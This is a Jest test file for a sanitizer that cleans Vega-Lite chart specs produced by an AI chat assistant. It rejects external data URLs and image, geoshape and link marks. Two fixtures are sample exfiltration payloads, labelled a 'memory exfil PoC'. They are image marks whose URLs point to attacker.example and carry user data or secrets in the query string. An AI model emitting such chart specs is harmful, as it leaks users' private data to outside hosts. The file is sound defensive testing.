import { sanitizeVegaSpec, VegaSpecParseError, VegaSpecSecurityError } from './sanitizeVegaSpec';
import { PROTON_BAR_COLOR } from './protonVegaTheme';

describe('sanitizeVegaSpec', () => {
    const validSpec = JSON.stringify({
        $schema: 'https://vega.github.io/schema/vega-lite/v5.json',
        description: 'Sample chart',
        data: {
            values: [
                { category: 'A', amount: 28 },
                { category: 'B', amount: 55 },
            ],
        },
        mark: 'bar',
        encoding: {
            x: { field: 'category', type: 'nominal' },
            y: { field: 'amount', type: 'quantitative' },
        },
    });

    it('accepts inline Vega-Lite specs', () => {
        const spec = sanitizeVegaSpec(validSpec);
        expect(spec).toMatchObject({
            mark: { type: 'bar', color: PROTON_BAR_COLOR },
        });
    });

    it('rejects external data URLs', () => {
        const spec = JSON.stringify({
            data: { url: 'https://example.com/data.json' },
            mark: 'bar',
            encoding: {
                x: { field: 'category', type: 'nominal' },
                y: { field: 'amount', type: 'quantitative' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
    });

    it('rejects nested lookup data URLs', () => {
        const spec = JSON.stringify({
            transform: [
                {
                    lookup: 'id',
                    from: {
                        data: {
                            url: 'https://example.com/lookup.json',
                        },
                        key: 'id',
                        fields: ['value'],
                    },
                },
            ],
            mark: 'bar',
            encoding: {
                x: { field: 'category', type: 'nominal' },
                y: { field: 'amount', type: 'quantitative' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
    });

    it('strips dangerous usermeta embed overrides', () => {
        const spec = JSON.stringify({
            usermeta: {
                embedOptions: {
                    loader: { http: true },
                    actions: true,
                },
            },
            data: { values: [{ x: 1 }] },
            mark: 'point',
            encoding: {
                x: { field: 'x', type: 'quantitative' },
            },
        });

        const sanitized = sanitizeVegaSpec(spec) as { usermeta?: Record<string, unknown> };
        expect(sanitized.usermeta?.embedOptions).toBeUndefined();
    });

    it('rejects invalid JSON', () => {
        expect(() => sanitizeVegaSpec('{ not json')).toThrow(VegaSpecParseError);
        expect(() => sanitizeVegaSpec('{ not json')).toThrow(/not valid JSON/);
    });

    it('accepts trailing commas from LLM output', () => {
        const spec = `{
            "mark": "bar",
            "encoding": {
                "x": { "field": "category", "type": "nominal" },
                "y": { "field": "amount", "type": "quantitative" },
            },
            "data": { "values": [{ "category": "A", "amount": 1 },] },
        }`;

        expect(sanitizeVegaSpec(spec)).toMatchObject({ mark: { type: 'bar', color: PROTON_BAR_COLOR } });
    });

    it('accepts unquoted object keys from LLM output', () => {
        const spec = `{
            "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
            "width": "container",
            "data": {
                "values": [
                    {"week": 1, "DAU": 31.2},
                    {"week": 2, "DAU": 33.4}
                ]
            },
            "mark": {"type": "line", "point": true},
            "encoding": {
                "x": {"field": "week", "type": "ordinal", "axis": {"title": "Week"}},
                "y": {"field": "DAU", "type": "quantitative", "axis": {"title": "DAU (k)", format: ".1f"}}
            }
        }`;

        const sanitized = sanitizeVegaSpec(spec) as {
            encoding?: { y?: { axis?: { format?: string } } };
        };

        expect(sanitized.encoding?.y?.axis).toMatchObject({ format: '.1f' });
    });

    it('allows url as a data field name inside inline values', () => {
        const spec = JSON.stringify({
            mark: 'bar',
            encoding: {
                x: { field: 'url', type: 'nominal' },
                y: { field: 'amount', type: 'quantitative' },
            },
            data: {
                values: [{ url: 'https://example.com/page', amount: 3 }],
            },
        });

        expect(sanitizeVegaSpec(spec)).toMatchObject({ mark: { type: 'bar', color: PROTON_BAR_COLOR } });
    });

    it('repairs double-wrapped objects in data.values arrays', () => {
        const spec = `{
            "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
            "width": "container",
            "data": {
                "values": [
                    { "hour": 0, "rate": 0.41 },
                    { "hour": 14, "rate": 1.34 }
                ]
            },
            "layer": [
                {
                    "mark": { "type": "bar" },
                    "encoding": {
                        "x": { "field": "hour", "type": "ordinal" },
                        "y": { "field": "rate", "type": "quantitative" }
                    }
                },
                {
                    "data": { "values": [{ { "threshold": 0.46 } }] },
                    "mark": { "type": "rule" },
                    "encoding": {
                        "y": { "field": "threshold", "type": "quantitative" }
                    }
                }
            ]
        }`;

        const sanitized = sanitizeVegaSpec(spec) as {
            layer?: { data?: { values?: { threshold?: number }[] } }[];
        };

        expect(sanitized.layer?.[1]?.data?.values).toEqual([{ threshold: 0.46 }]);
    });

    it('does not break valid nested objects inside array values', () => {
        const spec = JSON.stringify({
            data: { values: [{ metrics: { rate: 0.46, count: 3 } }] },
            mark: 'bar',
            encoding: {
                x: { field: 'metrics', type: 'nominal' },
                y: { field: 'count', type: 'quantitative' },
            },
        });

        expect(sanitizeVegaSpec(spec)).toMatchObject({
            data: { values: [{ metrics: { rate: 0.46, count: 3 } }] },
        });
    });

    it('forces responsive width so charts fill the card', () => {
        const spec = JSON.stringify({
            width: 480,
            height: 260,
            mark: 'line',
            encoding: {
                x: { field: 'year', type: 'ordinal' },
                y: { field: 'price', type: 'quantitative' },
            },
            data: {
                values: [{ year: 2020, price: 40 }],
            },
        });

        const sanitized = sanitizeVegaSpec(spec);
        expect(sanitized).toMatchObject({
            width: 'container',
            height: 260,
        });
        expect((sanitized as Record<string, unknown>).autosize).toEqual({ type: 'fit-x', contains: 'padding' });
    });

    it('rejects image marks that exfiltrate data via encoding.url (memory exfil PoC)', () => {
        const spec = JSON.stringify({
            $schema: 'https://vega.github.io/schema/vega-lite/v5.json',
            data: {
                values: [{ x: 1, y: 1, img: 'https://attacker.example/badge.png?d=Sebastian+Argentina' }],
            },
            mark: { type: 'image', width: 40, height: 40 },
            encoding: {
                x: { field: 'x', type: 'quantitative' },
                y: { field: 'y', type: 'quantitative' },
                url: { field: 'img', type: 'nominal' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
        expect(() => sanitizeVegaSpec(spec)).toThrow(/Mark type "image" is not allowed/);
    });

    it('rejects geoshape marks', () => {
        const spec = JSON.stringify({
            data: {
                values: [
                    {
                        type: 'Feature',
                        geometry: { type: 'Point', coordinates: [0, 0] },
                    },
                ],
            },
            mark: 'geoshape',
            encoding: {
                shape: { field: 'geojson', type: 'geojson' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
        expect(() => sanitizeVegaSpec(spec)).toThrow(/Mark type "geoshape" is not allowed/);
    });

    it('rejects nested image marks inside layer specs', () => {
        const spec = JSON.stringify({
            layer: [
                {
                    mark: 'bar',
                    encoding: {
                        x: { field: 'category', type: 'nominal' },
                        y: { field: 'amount', type: 'quantitative' },
                    },
                    data: { values: [{ category: 'A', amount: 1 }] },
                },
                {
                    data: { values: [{ x: 1, y: 1, img: 'https://attacker.example/leak.png?secret=1' }] },
                    mark: { type: 'image', width: 20, height: 20 },
                    encoding: {
                        x: { field: 'x', type: 'quantitative' },
                        y: { field: 'y', type: 'quantitative' },
                        url: { field: 'img', type: 'nominal' },
                    },
                },
            ],
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
    });

    it('rejects unknown mark types not on the allowlist', () => {
        const spec = JSON.stringify({
            data: { values: [{ value: 1 }] },
            mark: 'link',
            encoding: {
                href: { field: 'url', type: 'nominal' },
                tooltip: { field: 'value', type: 'quantitative' },
            },
        });

        expect(() => sanitizeVegaSpec(spec)).toThrow(VegaSpecSecurityError);
        expect(() => sanitizeVegaSpec(spec)).toThrow(/Mark type "link" is not allowed/);
    });
});
